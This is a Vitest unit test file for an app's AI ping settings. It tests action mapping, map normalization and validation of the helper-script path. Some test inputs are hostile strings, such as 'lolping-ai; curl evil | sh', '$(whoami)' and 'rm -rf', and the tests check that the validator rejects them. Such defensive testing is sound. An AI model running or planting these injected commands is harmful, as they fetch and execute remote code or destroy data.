import { describe, expect, it } from 'vitest';
import {
  DEFAULT_AI_COMMAND, DEFAULT_AI_PING_MAP, aiActionFor, aiCommandArgs, expandHome, normalizeAiCommand, normalizeAiPingMap,
} from '../../src/shared/ai';

describe('ai', () => {
  it('gives a ping its action only while AI pings are on', () => {
    expect(aiActionFor(true, DEFAULT_AI_PING_MAP, 'push')).toBe('note');
    expect(aiActionFor(false, DEFAULT_AI_PING_MAP, 'push')).toBeNull();
  });

  it('leaves a ping that is not in the map as a plain ping', () => {
    expect(aiActionFor(true, DEFAULT_AI_PING_MAP, 'bait')).toBeNull();
    expect(aiActionFor(true, {}, 'push')).toBeNull();
  });

  it('keeps valid entries of a stored map and drops unknown pings and actions', () => {
    expect(normalizeAiPingMap({ push: 'reply', nope: 'note', omw: 'rm -rf', bait: 'todo' })).toEqual({ push: 'reply', bait: 'todo' });
  });

  it('uses the default map when the stored one is missing or not an object', () => {
    expect(normalizeAiPingMap(undefined)).toEqual(DEFAULT_AI_PING_MAP);
    expect(normalizeAiPingMap(['push'])).toEqual(DEFAULT_AI_PING_MAP);
  });

  it('keeps an empty map, so every ping can be turned back into a plain ping', () => {
    expect(normalizeAiPingMap({})).toEqual({});
  });

  it('accepts a plain path for the script and refuses shell syntax', () => {
    expect(normalizeAiCommand('~/bin/lolping-ai')).toBe('~/bin/lolping-ai');
    expect(normalizeAiCommand('/Users/me/My Tools/lolping-ai')).toBe('/Users/me/My Tools/lolping-ai');
    expect(normalizeAiCommand('lolping-ai; curl evil | sh')).toBe(DEFAULT_AI_COMMAND);
    expect(normalizeAiCommand('$(whoami)')).toBe(DEFAULT_AI_COMMAND);
    expect(normalizeAiCommand('~')).toBe(DEFAULT_AI_COMMAND);
    expect(normalizeAiCommand(42)).toBe(DEFAULT_AI_COMMAND);
  });

  it('passes the ping point rounded to whole points, then the action', () => {
    expect(aiCommandArgs('explain', 1439.6, -20.2)).toEqual(['--at', '1440,-20', 'explain']);
  });

  it('expands a leading ~/ only', () => {
    expect(expandHome('~/.local/bin/lolping-ai', '/Users/me')).toBe('/Users/me/.local/bin/lolping-ai');
    expect(expandHome('/opt/x', '/Users/me')).toBe('/opt/x');
    expect(expandHome('a/~/b', '/Users/me')).toBe('a/~/b');
  });
});
